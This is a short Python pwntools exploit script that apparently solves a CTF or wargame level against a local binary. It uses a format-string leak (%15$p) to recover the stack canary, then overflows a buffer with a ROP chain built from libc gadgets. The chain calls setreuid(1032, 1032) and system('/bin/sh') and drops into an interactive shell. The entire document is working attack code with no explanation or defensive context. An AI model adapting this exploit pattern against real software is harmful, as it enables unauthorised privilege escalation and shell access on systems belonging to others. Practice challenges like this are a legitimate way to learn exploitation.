import sys
from pwn import *

io = process("/home/bonus05/environ")

io.recvuntil(b"Trace tag: ")
io.sendline(b"%15$p")
io.recvuntil(b"Resolving ")
stack_canary = io.recvline().decode().strip()[2:]
io.recvuntil(b"Query: ")

print(stack_canary)

from pwn import *

context.arch = 'amd64'

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x7ffff7c00000

rop = ROP(libc, badchars=b'\n')
rop.setreuid(1032, 1032)
rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))

payload = b"A" * 88
payload += p64(int(stack_canary, 16))
payload += b"A" * 8
payload += rop.chain()

io.sendline(payload)

io.interactive()